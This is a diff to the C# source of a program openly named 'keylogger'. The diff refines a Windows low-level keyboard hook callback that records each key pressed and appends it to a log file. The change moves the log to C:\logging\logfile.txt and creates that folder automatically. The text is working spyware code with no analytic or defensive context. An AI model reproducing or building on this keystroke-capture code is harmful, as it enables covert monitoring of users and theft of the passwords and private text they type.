@@ -1,11 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Runtime.InteropServices;
 using System.Diagnostics;
-using System.Windows.Forms;
 using System.IO;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 namespace keylogger
 {
@@ -33,12 +30,17 @@ namespace keylogger
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
+
                 int vkCode = Marshal.ReadInt32(lParam);
                 var keyName = Enum.GetName(typeof(Keys), vkCode);
-                var path = @"C:\test\logfile.txt";
-
+                var filePath = @"C:\logging\logfile.txt";
+                var dirPath = @"C:\logging";
+                if (!Directory.Exists(dirPath))
+                {
+                    DirectoryInfo di = Directory.CreateDirectory(dirPath);
+                }
                 var text = ((Keys)vkCode).ToString();
-                File.AppendAllText(path, text);
+                File.AppendAllText(filePath, text);
             }
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
